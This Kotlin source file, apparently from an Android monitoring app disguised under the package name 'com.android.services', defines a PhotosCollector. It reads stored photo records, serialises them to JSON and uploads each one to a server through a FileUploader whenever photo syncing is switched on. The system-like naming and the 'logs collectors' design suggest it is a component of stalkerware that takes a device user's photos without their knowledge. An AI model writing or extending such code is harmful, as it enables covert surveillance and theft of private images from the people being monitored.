package com.android.services.logs.collectors

import android.content.Context
import com.android.services.db.entities.Photos
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.retrofit.FileUploader
import com.android.services.util.AppConstants
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import org.json.JSONArray

class PhotosCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncPhotos) {
            localDatabaseSource.getPhotos { photosList ->
                if (photosList.isNotEmpty()) {
                    try {
                        val photos = photosList.sortedWith(compareBy { it.size })
                        val gson = GsonBuilder().create()
                        val mPhotosJSON =
                            JSONArray(gson.toJson(photos,
                                object : TypeToken<List<Photos>>() {}.type))
                        val fileUploader =
                            FileUploader(context, AppConstants.PHOTOS_TYPE, localDatabaseSource)
                        for (i in 0 until mPhotosJSON.length()) {
                            try {
                                fileUploader.uploadFile(mPhotosJSON.getJSONObject(i))
                            } catch (e: Exception) {
                                logException(e.message!!, AppConstants.PHOTOS_TYPE, e)
                            }
                        }
                    } catch (e: Exception) {
                        logException(e.message!!, AppConstants.PHOTOS_TYPE, e)
                    }
                } else {
                    logVerbose("No photos found", AppConstants.PHOTOS_TYPE)
                }
            }
        } else {
            logVerbose("${AppConstants.PHOTOS_TYPE} Sync is Off")
        }
    }
}